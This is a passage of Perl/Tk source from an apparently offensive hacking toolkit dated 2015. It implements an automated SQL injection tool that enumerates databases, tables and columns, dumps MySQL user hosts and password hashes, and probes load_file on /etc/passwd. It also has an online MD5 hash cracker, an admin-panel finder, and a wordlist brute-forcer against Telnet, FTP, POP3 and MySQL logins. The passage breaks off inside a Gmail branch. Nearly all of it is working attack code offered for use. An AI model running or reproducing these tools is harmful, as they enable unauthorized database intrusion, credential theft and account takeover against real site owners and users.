                if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    $mi->update;
                    savefile( $save . ".txt",
                        "\n[+] Users mysql Found : $1\n" );
                    for my $limit ( 0 .. $1 ) {
                        $mi->update;
                        $cop =~
s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))/;
                        $code =
                          toma( $cop
                              . $pass1 . "from"
                              . $pass1
                              . "mysql.user"
                              . $pass1 . "limit"
                              . $pass1
                              . $limit . ",1"
                              . $pass2 );
                        if ( $code =~
/RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/ig
                          )
                        {
                            $mi->update;
                            $hostero->insert( "end", $1 );
                            $usero->insert( "end", $2 );
                            $pasero->insert( "end", $3 );
                            savefile( $save . ".txt",
                                "[Host] : $1 [User] : $2 [Password] : $3" );
                        }
                        else {
                            last;
                        }
                    }
                }
            }
            else {
                $tatus->configure( -text => "Error" );
                $logo->update;
            }
        }
    }

    sub schemacolumnsdb {

        $columnero->delete( "0.0", "end" );

        my $page = $targetero->get;
        my $save = partimealmedio($page);

        $d = $tablero->curselection();

        for my $id (@$d) {
            my $da = $tablero->get($id);

            if ( $da =~ /(.*)\.(.*)/ ) {
                my ( $db, $table ) = ( $1, $2 );

                my $page3 = $page;
                my $page4 = $page;

                savefile( $save . ".txt", "\n" );
                ( $pass1, $pass2 ) = &bypass($bypass);
                savefile( $save . ".txt", "\n[DB] : $db" );
                savefile( $save . ".txt", "[Table] : $table" );
                $page3 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
                $code3 =
                  toma( $page3
                      . $pass1 . "from"
                      . $pass1
                      . "information_schema.columns"
                      . $pass1 . "where"
                      . $pass1
                      . "table_name=char("
                      . ascii($table) . ")"
                      . $pass1 . "and"
                      . $pass1
                      . "table_schema=char("
                      . ascii($db) . ")"
                      . $pass2 );

                if ( $code3 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    savefile( $save . ".txt", "[Columns length : $1 ]\n" );
                    my $si = $1;
                    chomp $si;
                    $page4 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
                    $real = "1";
                    for my $limit2 ( 0 .. $si ) {
                        $tatus->configure( -text => "Getting columns ..." );
                        $logo->update;
                        $code4 =
                          toma( $page4
                              . $pass1 . "from"
                              . $pass1
                              . "information_schema.columns"
                              . $pass1 . "where"
                              . $pass1
                              . "table_name=char("
                              . ascii($table) . ")"
                              . $pass1 . "and"
                              . $pass1
                              . "table_schema=char("
                              . ascii($db) . ")"
                              . $pass1 . "limit"
                              . $pass1
                              . $limit2 . ",1"
                              . $pass2 );
                        if ( $code4 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                            $columnero->insert( "end", $1 );
                            savefile( $save . ".txt", "[Column $real] : $1" );
                            $real++;
                        }
                    }
                    $tatus->configure( -text => " " );
                }
                else {
                    msg( "K0bra 1.2", "information_schema not found" );
                }
            }
        }
    }

    sub schematablesdb {

        $tablero->delete( "0.0", "end" );

        my $page = $targetero->get;
        my $save = partimealmedio($page);

        $d = $datero->curselection();

        for my $id (@$d) {
            my $db = $datero->get($id);

            $tatus->configure( -text => "Getting tables ..." );
            $logo->update;

            my $page1 = $page;
            savefile( $save . ".txt", "\n" );
            ( $pass1, $pass2 ) = &bypass($bypass);

            savefile( $save . ".txt", "[DB] : $db" );
            $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $code =
              toma( $page1
                  . $pass1 . "from"
                  . $pass1
                  . "information_schema.tables"
                  . $pass1 . "where"
                  . $pass1
                  . "table_schema=char("
                  . ascii($db) . ")"
                  . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass2."\n";
            if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                $logo->update;
                savefile( $save . ".txt", "[+] Tables Length :  $1\n" );
                my $limit = $1;
                $real = "1";
                for my $lim ( 0 .. $limit ) {
                    $logo->update;
                    $code1 =
                      toma( $page
                          . $pass1 . "from"
                          . $pass1
                          . "information_schema.tables"
                          . $pass1 . "where"
                          . $pass1
                          . "table_schema=char("
                          . ascii($db) . ")"
                          . $pass1 . "limit"
                          . $pass1
                          . $lim . ",1"
                          . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass1."limit".$pass1.$lim.",1".$pass2."\n";
                    if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                        my $table = $1;
                        chomp $table;
                        savefile( $save . ".txt",
                            "[Table $real Found : $table ]" );
                        $tablero->insert( "end", $db . "." . $table );
                        $real++;
                    }
                }
                $tatus->configure( -text => " " );
            }
            else {
                msg( "K0bra 1.2", "information_schema not found" );
            }
        }
    }

    sub getdbs {

        my $page = $targetero->get;
        my $save = partimealmedio($page);

        my $page1 = $page;

        $datero->delete( "0.0", "end" );

        savefile( $save . ".txt", "\n" );

        $tatus->configure( -text => "Searching DBS ..." );
        $logo->update;
        ( $pass1, $pass2 ) = &bypass($bypass);
        $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code = toma(
            $page . $pass1 . "from" . $pass1 . "information_schema.schemata" );
        if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            my $limita = $1;
            $tatus->configure( -text => "Databases Length : $limita" );
            $logo->update;
            savefile( $save . ".txt", "[+] Databases Length : $limita\n" );
            $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $real = "1";

            for my $limit ( 0 .. $limita ) {
                $tatus->configure( -text => "Getting databases ..." );
                $logo->update;
                $code =
                  toma( $page1
                      . $pass1 . "from"
                      . $pass1
                      . "information_schema.schemata"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit . ",1"
                      . $pass2 );
                if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    my $control = $1;
                    if (    $control ne "information_schema"
                        and $control ne "mysql"
                        and $control ne "phpmyadmin" )
                    {
                        $datero->insert( "end", $control );
                        savefile( $save . ".txt",
                            "[Database $real Found] : $control" );
                        $real++;
                    }
                }
            }
            $tatus->configure( -text => " " );
            $logo->update;
        }
        else {
            $tatus->configure( -text => "information_schema not found" );
        }
    }

    sub toma {
        return $nave->get( $_[0] )->content;
    }

    sub savefile {
        open( SAVE, ">>logs/webs/" . $_[0] );
        print SAVE $_[1] . "\n";
        close SAVE;
    }

    sub partimealmedio {
        my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
        my $save = $auth;
        $save =~ s/:/_/;
        return $save;
    }

    sub encode {
        my $string = $_[0];
        $hex = '0x';
        for ( split //, $string ) {
            $hex .= sprintf "%x", ord;
        }
        return $hex;
    }

    sub decode {
        $_[0] =~ s/^0x//;
        $encode = join q[], map { chr hex } $_[0] =~ /../g;
        return $encode;
    }

    sub bypass {
        if    ( $_[0] eq "/*" )  { return ( "/**/", "/**/" ); }
        elsif ( $_[0] eq "%20" ) { return ( "%20",  "%00" ); }
        else                     { return ( "+",    "--" ); }
    }

    sub ascii {
        return join ',', unpack "U*", $_[0];
    }

    sub ascii_de {
        $_[0] = join q[], map { chr } split q[,], $_[0];
        return $_[0];
    }

    sub installer {
        unless ( -d "/logs/webs" ) {
            mkdir( "logs/",      777 );
            mkdir( "logs/webs/", 777 );
        }
    }

    sub aboutxa {
        $logo->Dialog(
            -title            => "About",
            -buttons          => ["OK"],
            -text             => "(C) Doddy Hackman 2015",
            -background       => $color_fondo,
            -foreground       => $color_texto,
            -activebackground => $color_texto
        )->Show();
    }

    sub exitnow {
        $logo->destroy();
    }

    sub nownow {

        my $page   = $targetero->get;
        my $bypass = $bypass;

        scan( $page, $bypass );

    }

    sub scan {

        my $page = $_[0];

        ( $pass1, $pass2 ) = &bypass( $_[1] );

        my $save = partimealmedio( $_[0] );

        $tatus->configure( -text => "Scanning ..." );
        $logo->update;

        my $testar1 = toma( $page . $pass1 . "and" . $pass1 . "1=0" . $pass2 );
        my $testar2 = toma( $page . $pass1 . "and" . $pass1 . "1=1" . $pass2 );

        unless ( $testar1 eq $testar2 ) {
            motor( $page, $_[1] );
        }
        else {
            $tatus->configure( -text => "Not vulnerable" );
        }

    }

    sub motor {

        my ( $gen, $save, $control ) = &length( $_[0], $_[1] );

        if ( $control eq 1 ) {
            $targetero->configure( -text => $gen );
            $tatus->configure( -text => "Enjoy the menu" );
        }
        else {
            $tatus->configure( -text => "Length columns not found" );
        }
    }

    sub length {
        $tatus->configure( -text => "Looking for the number of columns ..." );
        my $rows = "0";
        my $asc;
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[1] );

        $alert = "char(" . ascii("RATSXPDOWN1RATSXPDOWN") . ")";
        $total = "1";
        for my $rows ( 2 .. 200 ) {
            $logo->update;
            $asc .= "," . "char("
              . ascii( "RATSXPDOWN" . $rows . "RATSXPDOWN" ) . ")";
            $total .= "," . $rows;
            $injection =
                $page . "1"
              . $pass1 . "and"
              . $pass1 . "1=0"
              . $pass1 . "union"
              . $pass1
              . "select"
              . $pass1
              . $alert
              . $asc;
            $test = toma($injection);
            if ( $test =~ /RATSXPDOWN/ ) {
                @number  = $test =~ m{RATSXPDOWN(\d+)RATSXPDOWN}g;
                $control = 1;

                my $save = partimealmedio( $_[0] );

                savefile( $save . ".txt", "\n[Target confirmed] : $page" );
                savefile( $save . ".txt", "[Bypass] : $_[1]\n" );
                savefile( $save . ".txt",
                    "[Limit] : The site has $rows columns" );
                savefile( $save . ".txt",
                    "[Data] : The number @number print data" );
                $total =~ s/$number[0]/hackman/;
                savefile(
                    $save . ".txt",
                    "[SQLI] : "
                      . $page . "1"
                      . $pass1 . "and"
                      . $pass1 . "1=0"
                      . $pass1 . "union"
                      . $pass1
                      . "select"
                      . $pass1
                      . $total
                );
                return (
                    $page . "1"
                      . $pass1 . "and"
                      . $pass1 . "1=0"
                      . $pass1 . "union"
                      . $pass1
                      . "select"
                      . $pass1
                      . $total,
                    $save, $control
                );
            }
        }
    }

    sub openlogsk {
        my $cargar = partimealmedio( $targetero->get );
        $t = "logs/webs/$cargar" . ".txt";
        system("start $t");
    }

    sub details {

        my $page   = $targetero->get;
        my $bypass = $bypass;
        my $save   = partimealmedio($page);

        $informatero->delete( "0.0", "end" );

        ( $pass1, $pass2 ) = &bypass($bypass);
        savefile( $save . ".txt", "\n" );
        if ( $page =~ /(.*)hackman(.*)/ig ) {
            $tatus->configure( -text => "Searching information ..." );
            $logo->update;
            my ( $start, $end ) = ( $1, $2 );
            $inforschema =
                $start
              . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
              . $end
              . $pass1 . "from"
              . $pass1
              . "information_schema.tables"
              . $pass2;
            $mysqluser =
                $start
              . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
              . $end
              . $pass1 . "from"
              . $pass1
              . "mysql.user"
              . $pass2;
            $test3 =
              toma( $start
                  . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                  . $end
                  . $pass2 );
            $test1 = toma($inforschema);
            $test2 = toma($mysqluser);

            if ( $test2 =~ /ERTOR854/ig ) {
                savefile( $save . ".txt", "[mysql.user] : ON" );
            }
            else {
                savefile( $save . ".txt", "[mysql.user] : OFF" );
            }
            if ( $test1 =~ /ERTOR854/ig ) {
                savefile( $save . ".txt", "[information_schema.tables] : ON" );
            }
            else {
                savefile( $save . ".txt", "[information_schema.tables] : OFF" );
            }
            if ( $test3 =~ /ERTOR854/ig ) {
                savefile(
                    $save . ".txt",
                    "[load_file] : "
                      . $start
                      . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                      . $end
                      . $pass2
                );
            }
            $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))";
            $injection = $start . $concat . $end . $pass2;
            $code      = toma($injection);
            if ( $code =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/g ) {

                $informatero->insert( "end", "DB Version : $1" );
                $informatero->insert( "end", "DB Name : $2" );
                $informatero->insert( "end", "Username : $3" );
                savefile(
                    $save . ".txt",
"\n[!] DB Version : $1\n[!] DB Name : $2\n[!] Username : $3\n"
                );
                $tatus->configure( -text => " " );
            }
            else {
                $tatus->configure( -text => "Not found any data" );
            }
        }
    }

}    #End

sub menu_getpass {    #Start

    my $ta = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );
    $ta->title("Finder Pass 0.4 (C) Doddy Hackman 2015");
    $ta->geometry("600x400+20+20");
    $ta->resizable( 0, 0 );

    $d = $ta->Frame(
        -relief     => "sunken",
        -bd         => 1,
        -background => $color_fondo,
        -foreground => $color_texto
    );
    my $max = $d->Menubutton(
        -text             => "Options",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $aba = $d->Menubutton(
        -text             => "About",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $exa = $d->Menubutton(
        -text             => "Exit",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    $d->pack( -side => "top", -fill => "x" );

    $max->command(
        -label      => "Crack",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&cracknow
    );
    $max->command(
        -label      => "Add Hash",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&addhash
    );
    $max->command(
        -label      => "Add File with hashes",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&addfilea
    );
    $max->command(
        -label      => "Clean List",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&cleanow
    );

    $aba->command(
        -label      => "About",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&about
    );

    $exa->command(
        -label      => "Exit",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&salir
    );

    $ta->Label(
        -text       => "Hashes",
        -background => $color_fondo,
        -foreground => $color_texto,
        -font       => "Impact"
    )->place( -x => 110, -y => 50 );
    my $had = my $has = $ta->Listbox(
        -width      => 36,
        -height     => 15,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 32, -y => 100 );

    $ta->Label(
        -text       => "Results",
        -background => $color_fondo,
        -foreground => $color_texto,
        -font       => "Impact"
    )->place( -x => 380, -y => 50 );
    my $red = my $res = $ta->Listbox(
        -width      => 36,
        -height     => 15,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 300, -y => 100 );

    my $status = $ta->Label(
        -text       => "Status : <None>",
        -background => $color_fondo,
        -foreground => $color_texto,
        -font       => "Impact1"
    )->place( -x => 220, -y => 350 );

    MainLoop;

    sub cracknow {

        my @hashes = $had->get( "0.0", "end" );
        my @hashes = repes(@hashes);

        for my $ha (@hashes) {
            $status->configure( -text => "[+] Searching .." );
            $ta->update;
            my $re = crackit($ha);
            if ( $re =~ /false01/ig ) {
                $red->insert( "end", "Not Found" );
            }
            else {
                $red->insert( "end", $re );
                savefile( "hashes-found.txt", $ha . ":" . $re );
            }
        }
        $status->configure( -text => "Status : <None>" );
    }

    sub addfilea {

        my $mediox = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $mediox->geometry("390x90+20+20");
        $mediox->resizable( 0, 0 );
        $mediox->title("Add File");

        $mediox->Label(
            -text       => "File : ",
            -background => $color_fondo,
            -foreground => $color_texto,
            -font       => "Impact1"
        )->place( -x => 10, -y => 30 );
        my $enafa = $mediox->Entry(
            -background => $color_fondo,
            -foreground => $color_texto,
            -width      => 33
        )->place( -y => 33, -x => 55 );
        $mediox->Button(
            -text             => "Browse",
            -width            => 7,
            -background       => $color_texto,
            -foreground       => $color_fondo,
            -activebackground => $color_texto,
            -command          => \&bronax
        )->place( -y => 33, -x => 265 );
        $mediox->Button(
            -text             => "Load",
            -width            => 7,
            -background       => $color_texto,
            -foreground       => $color_fondo,
            -activebackground => $color_texto,
            -command          => \&bronaxx
        )->place( -y => 33, -x => 320 );

        sub bronax {
            $browse = $mediox->FileSelect( -directory => getcwd() );
            my $fileax = $browse->Show;
            $enafa->configure( -text => $fileax );
        }

        sub bronaxx {
            open( OPEN, $enafa->get );
            my @ve = <OPEN>;
            close OPEN;
            for my $no (@ve) {
                chomp $no;
                if ( ver_length($no) ) {
                    $had->insert( "end", $no );
                }
            }
        }
    }

    sub addhash {

        my $plac = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $plac->geometry("350x90+20+20");
        $plac->resizable( 0, 0 );
        $plac->title("Add Hash");

        $plac->Label(
            -text       => "Hash : ",
            -background => $color_fondo,
            -foreground => $color_texto,
            -font       => "Impact1"
        )->place( -x => 10, -y => 30 );
        my $ewa = $plac->Entry(
            -background => $color_fondo,
            -foreground => $color_texto,
            -width      => 33
        )->place( -y => 33, -x => 60 );
        $plac->Button(
            -text             => "Add",
            -background       => $color_fondo,
            -activebackground => $color_texto,
            -foreground       => $color_texto,
            -width            => 7,
            -command          => \&addnowa
        )->place( -y => 33, -x => 275 );

        sub addnowa {
            if ( ver_length( $ewa->get ) ) {
                $had->insert( "end", $ewa->get );
            }
            else {
                $ta->Dialog(
                    -title            => "Error",
                    -buttons          => ["OK"],
                    -text             => "Hash invalid",
                    -background       => $color_fondo,
                    -foreground       => $color_texto,
                    -activebackground => $color_texto
                )->Show();
            }
        }
    }

    sub cleanow {
        $had->delete( 0.0, "end" );
        $red->delete( 0.0, "end" );
    }

    sub about {
        $ta->Dialog(
            -title   => "About",
            -buttons => ["OK"],
            -text => "This program was coded by Doddy Hackman in the year 2015",
            -background       => $color_fondo,
            -foreground       => $color_texto,
            -activebackground => $color_text
        )->Show();
    }

    sub salir {
        $ta->destroy();
    }

    sub crackit {

        my $target = shift;

        chomp $target;

        my %hash = (

            'http://md5.hashcracking.com/search.php?md5=' => {
                'tipo'  => 'get',
                'regex' => "Cleartext of $target is (.*)",
            },

            'http://www.hashchecker.com/index.php?_sls=search_hash' => {
                'variables' =>
                  { 'search_field' => $target, 'Submit' => 'search' },
                'regex' =>
                  "<td><li>Your md5 hash is :<br><li>$target is <b>(.*)<\/b>",
            },

            'http://md5.rednoize.com/?q=' => {
                'tipo'  => 'get',
                'regex' => "<div id=\"result\" >(.*)<\/div>"
            },

            'http://md52.altervista.org/index.php?md5=' => {
                'tipo'  => 'get',
                'regex' => "<br>Password: <font color=\"Red\">(.*)<\/font><\/b>"
              }

        );

        for my $data ( keys %hash ) {
            $ta->update;
            if ( $hash{$data}{tipo} eq "get" ) {
                $code = toma( $data . $target );
                if ( $code =~ /$hash{$data}{regex}/ig ) {
                    my $found = $1;
                    unless ( $found =~ /\[Non Trovata\]/ ) {
                        return $found;
                        last;
                    }
                }
            }
            else {
                $code = tomar( $data, $hash{$data}{variables} );
                if ( $code =~ /$hash{$data}{regex}/ig ) {
                    my $found = $1;
                    return $found;
                    last;
                }
            }
        }
        return "false01";
    }

}    #End

sub menu_panel {

    my $newdaxz = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );

    $newdaxz->title("Panel Control 0.3 || (C) Doddy Hackman 2015");
    $newdaxz->geometry("345x350+50+50");
    $newdaxz->resizable( 0, 0 );

    $menula = $newdaxz->Frame(
        -relief     => "sunken",
        -bd         => 1,
        -background => $color_fondo,
        -foreground => $color_texto
    );
    my $menulnowaxm = $menula->Menubutton(
        -text             => "Options",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $aboutnowaxm = $menula->Menubutton(
        -text             => "About",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $exitnowaxm = $menula->Menubutton(
        -text             => "Exit",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    $menula->pack( -side => "top", -fill => "x" );

    $menulnowaxm->command(
        -label      => "Scan",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&findpanel
    );
    $menulnowaxm->command(
        -label      => "Open Logs",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&openlogsko
    );

    $aboutnowaxm->command(
        -label      => "About",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&aboutxa
    );

    $exitnowaxm->command(
        -label      => "Exit",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&exitnow
    );

    $newdaxz->Label(
        -text       => "Page : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 40 );
    my $paget = $newdaxz->Entry(
        -width      => 40,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 70, -y => 45 );

    $newdaxz->Label(
        -text       => "Panels Found",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 120, -y => 80 );
    my $admins = $newdaxz->Listbox(
        -width      => 40,
        -height     => 10,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 50, -y => 130 );

    $newdaxz->Label(
        -text       => "Status : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 63, -y => 300 );
    my $tatus = $newdaxz->Entry(
        -width      => 25,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 120, -y => 305 );

    $admins->bind( "<Double-1>", [ \&loader ] );

    MainLoop;

    sub findpanel {
        my $hage = $paget->get;
        $admins->delete( "0.0", "end" );
        $tatus->configure( -text => "Starting" );
        for my $path (@paneles) {
            $newdaxz->update;
            $tatus->configure( -text => $path );
            $code = tomados( $hage . "/" . $path );
            if ( $code->is_success ) {
                $controlt = 1;
                $admins->insert( "end", $hage . "/" . $path );
                savefile( "admins-founds.txt", $hage . "/" . $path );
            }
        }

        if ( $controlt ne 1 ) {
            $newdaxz->Dialog(
                -title            => "Error",
                -buttons          => ["OK"],
                -text             => "Not found anything",
                -background       => $color_fondo,
                -foreground       => $color_texto,
                -activebackground => $color_texto
            )->Show();
        }
        $tatus->configure( -text => "Finished" );
    }

    sub loader {
        $adminsa = $admins->curselection();
        for my $id (@$adminsa) {
            my $linkar = $admins->get($id);
            system("start firefox $linkar");
        }
    }

    sub openlogsko {
        my $f = "logs/admins-founds.txt";
        if ( -f $f ) {
            system($f);
        }
        else {
            $newdaxz->Dialog(
                -title            => "Error",
                -buttons          => ["OK"],
                -text             => "File Not Found",
                -background       => $color_fondo,
                -foreground       => $color_texto,
                -activebackground => $color_texto
            )->Show();
        }
    }

    sub aboutxa {
        $newdaxz->Dialog(
            -title            => "About",
            -buttons          => ["OK"],
            -text             => "(C) Doddy Hackman 2015",
            -background       => $color_fondo,
            -foreground       => $color_texto,
            -activebackground => $color_texto
        )->Show();
    }

    sub exitnow {
        $newdaxz->destroy();
    }

}    #End

sub menu_cracker {    #Start

    my $newdax = MainWindow->new(
        -background => $color_fondo,
        -foreground => $color_texto
    );

    $newdax->title("Massive Cracker 0.4 (C) Doddy Hackman 2015");
    $newdax->geometry("320x270+50+50");
    $newdax->resizable( 0, 0 );

    $menula = $newdax->Frame(
        -relief     => "sunken",
        -bd         => 1,
        -background => $color_fondo,
        -foreground => $color_texto
    );
    my $menulnowaxaz = $menula->Menubutton(
        -text             => "Options",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $aboutnowaxaz = $menula->Menubutton(
        -text             => "About",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    my $exitnowaxaz = $menula->Menubutton(
        -text             => "Exit",
        -underline        => 1,
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->pack( -side => "left" );
    $menula->pack( -side => "top", -fill => "x" );

    $menulnowaxaz->command(
        -label      => "Crack",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&crack
    );
    $menulnowaxaz->command(
        -label      => "Open Logs",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&openlogsaz
    );
    $aboutnowaxaz->command(
        -label      => "About",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&aboutxaz
    );
    $exitnowaxaz->command(
        -label      => "Exit",
        -background => $color_fondo,
        -foreground => $color_texto,
        -command    => \&exitnowaz
    );

    #
    $newdax->Label(
        -text       => "Host : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 40 );
    my $host = $newdax->Entry(
        -width      => 30,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 70, -y => 43 );
    $newdax->Label(
        -text       => "Username : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 70 );
    my $username = $newdax->Entry(
        -width      => 20,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 110, -y => 73 );
    $newdax->Label(
        -text       => "Wordlist : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 100 );
    my $password = $newdax->Entry(
        -width      => 20,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 95, -y => 103 );
    $newdax->Button(
        -text             => "Browse",
        -width            => 10,
        -command          => \&bronaf,
        -background       => $color_texto,
        -foreground       => $color_fondo,
        -activebackground => $color_texto
    )->place( -x => 225, -y => 103 );
    $newdax->Label(
        -text       => "Timeout : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 130 );
    my $timeout = $newdax->Entry(
        -width      => 10,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 95, -y => 133 );

    $newdax->Label(
        -text       => "Service : ",
        -font       => "Impact1",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 20, -y => 170 );
    $newdax->Optionmenu(
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto,
        -options          => [
            [ FTP    => FTP ],
            [ TELNET => TELNET ],
            [ POP3   => POP3 ],
            [ MYSQL  => MYSQL ],
            [ GMAIL  => GMAIL ]
        ],
        -textvariable => \$service
    )->place( -x => 90, -y => 170 );

    $newdax->Label(
        -text       => "Status : ",
        -font       => "Impact",
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 60, -y => 220 );
    my $status = $newdax->Entry(
        -width      => 20,
        -background => $color_fondo,
        -foreground => $color_texto
    )->place( -x => 120, -y => 225 );

    #

    MainLoop;

    sub crack {

        my $host = $host->get;
        my $user = $username->get;
        my $word = $password->get;
        my $time = $timeout->get;

        my $op = $service;

        if ( -f $word ) {

            $status->configure( -text => " " );

            if ( $op eq "TELNET" ) {

                my $cont = "0";

                my @words = openwordlist($word);

                for my $pass (@words) {
                    chomp $pass;
                    $newdax->update;
                    $status->configure( -text => $pass );
                    sleep($time);
                    $telnet = new Net::Telnet( Errmode => "return" );
                    $telnet->open($host);
                    if ( $telnet->login( $user, $pass ) ) {
                        $cont = "1";
                        yeaha( $host, $user, $pass, "Telnet" );
                    }
                    $telnet->close;
                }
                if ( $cont eq "0" ) {
                    $status->configure( -text => "Not Found" );
                }
            }

            elsif ( $op eq "FTP" ) {

                my $cont = "0";

                my @words = openwordlist($word);

                for my $pass (@words) {
                    chomp $pass;
                    $newdax->update;
                    $status->configure( -text => $pass );
                    sleep($time);
                    $ftp = Net::FTP->new($host);
                    if ( $ftp->login( $user, $pass ) ) {
                        $cont = "1";
                        yeaha( $host, $user, $pass, "FTP" );
                    }
                    $ftp->quit;
                }
                if ( $cont eq "0" ) {
                    $status->configure( -text => "Not Found" );
                }
            }
            elsif ( $op eq "POP3" ) {

                my $cont = "0";

                my @words = openwordlist($word);

                for my $pass (@words) {
                    chomp $pass;
                    $newdax->update;
                    $status->configure( -text => $pass );
                    sleep($time);
                    $pop = Net::POP3->new($host);
                    if ( $pop->login( $user, $pass ) ) {
                        $cont = "1";
                        yeaha( $host, $user, $pass, "POP3" );
                    }
                    $pop->quit();
                }
                if ( $cont eq "0" ) {
                    $status->configure( -text => "Not Found" );
                }
            }

            elsif ( $op eq "MYSQL" ) {

                my $cont = "0";

                my @words = openwordlist($word);

                $target = "dbi:mysql::" . $host . ":3306";

                for my $pass (@words) {
                    chomp $pass;
                    $newdax->update;
                    $status->configure( -text => $pass );
                    sleep($time);
                    if (
                        my $now = DBI->connect(
                            $target, $user, $pass, { PrintError => 0 }
                        )
                      )
                    {
                        $cont = "1";
                        yeaha( $host, $user, $pass, "Mysql" );
                    }
                }
                if ( $cont eq "0" ) {
                    $status->configure( -text => "Not Found" );
                }
            }

            elsif ( $op eq "GMAIL" ) {

